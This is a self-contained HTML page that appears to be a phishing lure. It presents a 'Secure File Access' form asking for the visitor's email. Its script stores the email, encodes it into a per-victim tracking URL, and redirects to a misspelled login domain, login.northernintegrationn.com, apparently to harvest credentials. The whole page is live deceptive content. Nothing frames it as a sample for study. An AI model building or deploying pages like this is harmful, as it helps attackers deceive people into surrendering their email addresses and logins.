<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure File Access</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #74ebd5, #acb6e5);
            color: #333;
        }
        .form-container {
            background: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
            text-align: center;
            max-width: 450px;
            width: 90%;
            animation: slideIn 0.8s ease-out;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            font-size: 1.8em;
            margin-bottom: 15px;
            color: #1a3c5e;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        h1 i {
            color: #ff6f61;
            font-size: 1.4em;
        }
        p {
            font-size: 1em;
            margin-bottom: 25px;
            color: #4a4a4a;
        }
        input[type="email"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 1em;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }
        input[type="email"]:focus {
            border-color: #ff6f61;
            box-shadow: 0 0 8px rgba(255, 111, 97, 0.3);
            outline: none;
        }
        button {
            background: linear-gradient(90deg, #ff6f61, #ffb88c);
            color: white;
            padding: 12px 35px;
            border: none;
            border-radius: 6px;
            font-size: 1.1em;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s ease;
        }
        button:hover {
            background: linear-gradient(90deg, #ff8a75, #ffd1a4);
            transform: translateY(-2px);
        }
        .error-message {
            color: #c0392b;
            font-size: 0.85em;
            margin-top: 8px;
            display: none;
        }
        @media (max-width: 500px) {
            .form-container {
                padding: 20px;
                width: 95%;
            }
            button {
                padding: 10px 25px;
                font-size: 1em;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>
<body>
    <div class="form-container">
        <h1><i class="fas fa-shield-alt"></i> Access Your File</h1>
        <p>Please provide your email to access the secure file.</p>
        <form id="emailForm">
            <input type="email" id="emailField" placeholder="Your email address" required>
            <p id="errorText" class="error-message">Invalid email address. Please try again.</p>
            <button type="submit">Proceed</button>
        </form>
    </div>

    <script>
        function generateUniqueUrl(email) {
            const timestamp = Date.now();
            const uniqueId = btoa(email + timestamp).replace(/=/g, '');
            return `https://login.northernintegrationn.com/c/${uniqueId}`;
        }

        function processEmail() {
            const emailField = document.getElementById('emailField').value;
            const errorText = document.getElementById('errorText');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (emailRegex.test(emailField)) {
                localStorage.setItem('userEmail', emailField);
                // Store the unique URL for tracking purposes
                const uniqueUrl = generateUniqueUrl(emailField);
                localStorage.setItem('uniqueAccessUrl', uniqueUrl);
                // Redirect to the fixed URL
                window.location.assign('https://login.northernintegrationn.com/c');
            } else {
                errorText.style.display = 'block';
            }
        }

        // Handle form submission for both button click and Enter key
        const form = document.getElementById('emailForm');
        form.addEventListener('submit', (event) => {
            event.preventDefault();
            processEmail();
        });

        // Clear error message on input
        document.getElementById('emailField').addEventListener('input', () => {
            document.getElementById('errorText').style.display = 'none';
        });
    </script>
</body>
</html>
